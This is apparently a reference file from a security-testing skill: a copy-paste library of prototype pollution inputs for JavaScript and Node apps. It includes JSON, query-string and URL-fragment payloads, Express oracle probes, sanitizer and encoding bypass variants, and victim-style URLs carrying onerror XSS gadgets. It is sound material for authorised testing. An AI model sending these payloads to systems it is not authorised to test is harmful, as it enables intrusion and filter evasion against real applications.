# Copy-paste prototype pollution test-input library — Open WHEN: you have a JS/Node merge or dotted-path sink and need the exact key shapes for JSON bodies, query strings, URL fragments, and the filter-bypass variants

The SKILL.md body covers detection oracles and the merge-sink theory. This file is
the ready-to-paste string library. Pick the shape that matches the sink, send it,
then confirm the write landed on an unrelated object with `({}).testpp`.

Convention below: `testpp` is the unique marker property — choose a random name per
test so a stale pollution from an earlier run cannot be mistaken for a fresh hit.

## JSON body forms (server-side, JSON.parse + deep merge)

Send with `Content-Type: application/json`.

```json
{"__proto__": {"testpp": "polluted"}}
{"__proto__.testpp": "polluted"}
{"constructor": {"prototype": {"testpp": "polluted"}}}
{"constructor": {"prototype": {"testpp": "polluted", "json spaces": 10}}}
```

The single-key dotted form `{"__proto__.testpp":"polluted"}` matters for setters
that split a key on `.` (lodash `_.set`-style) rather than walking a nested object.

## Query-string forms (Express `qs` parser, `extended: true`)

`?a[b]=c` becomes `{a:{b:'c'}}`, so the prototype is reachable via brackets:

```
?__proto__[testpp]=polluted
?__proto__[testpp]=polluted&__proto__[two]=polluted2
?constructor[prototype][testpp]=polluted
?a[constructor][prototype][testpp]=polluted
?__proto__.testpp=polluted
```

## URL fragment / hash forms (client-side only — server never sees these)

```
#a=b&__proto__[testpp]=polluted
#__proto__[testpp]=polluted
#constructor[prototype][testpp]=polluted
#__proto__[onerror]=alert(1)&__proto__[src]=image
#a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

## Bare assignment forms (dotted-path / `_.set(obj, userPath, val)` setters)

When the sink is `_.set(obj, userControlledPath, val)` or similar, the path itself
carries the chain:

```
__proto__[testpp] = polluted
__proto__.testpp = polluted
x[__proto__][testpp] = polluted
x.__proto__.testpp = polluted
constructor.prototype.testpp = polluted
```

## Direct-expression forms (when you can run JS, e.g. a node REPL / eval sink)

```js
Object.prototype.testpp = "polluted"
Object.__proto__["testpp"] = "polluted"
Object.__proto__.testpp = "polluted"
Object.constructor.prototype.testpp = "polluted"
Object.constructor["prototype"]["testpp"] = "polluted"
({}).__proto__.testpp = "polluted"
```

## Express framework-internal oracle inputs (blackbox SSPP, no DoS)

Each pollutes one framework default whose effect shows in the response. Send the
JSON body, then send the listed follow-up request and check the described change.

| Test input (JSON body)                              | Follow-up + expected effect |
|-----------------------------------------------------|-----------------------------|
| `{"__proto__":{"parameterLimit":1}}`                | send 2 query params; only the first is processed/reflected |
| `{"__proto__":{"ignoreQueryPrefix":true}}`          | send `??foo=bar`; `foo=bar` now parses |
| `{"__proto__":{"allowDots":true}}`                  | send `?foo.bar=baz`; parses to nested object |
| `{"__proto__":{"json spaces":" "}}`                 | a JSON response gains a space after each `:` |
| `{"__proto__":{"exposedHeaders":["foo"]}}`          | response carries `Access-Control-Expose-Headers: foo` |
| `{"__proto__":{"status":510}}`                      | response status flips to 510 |

Status / json-spaces / exposed-header are the safest first probes — one visible
detail changes and nothing else breaks.

## Filter-bypass variants

When the literal key `__proto__` is stripped or rejected:

```json
{"constructor":{"prototype":{"testpp":"polluted"}}}
```

```
?constructor[prototype][testpp]=polluted
```

Non-recursive single-pass strip (sanitizer deletes the inner token once, leaving a
valid outer token):

```json
{"__pro__proto__to__":{"testpp":"polluted"}}
{"constconstructorructor":{"prototype":{"testpp":"polluted"}}}
```

Encoded brackets when the filter runs before URL-decoding (parser decodes after):

```
?__proto__%5btestpp%5d=polluted
?__proto__%255btestpp%255d=polluted     (double-encoded)
```

## Real-world URL shapes (seen in the wild — adapt the host/path)

```
https://victim.tld/#a=b&__proto__[admin]=1
https://victim.tld/#__proto__[xxx]=alert(1)
https://victim.tld/path?__proto__[src]=image&__proto__[onerror]=alert(1)
https://victim.tld/path?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
https://victim.tld/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
```

## Confirmation snippet (run after any input above)

Client-side (in the page console) or server-side (in a local node repro of the
sink), confirm the write hit the SHARED prototype, not just the target object:

```js
({}).testpp        // -> "polluted"  means Object.prototype is polluted
Object.prototype.testpp
```

If a fresh empty object reports your marker, the prototype is polluted. If only the
object you injected into has it, that is mass-assignment, not prototype pollution.
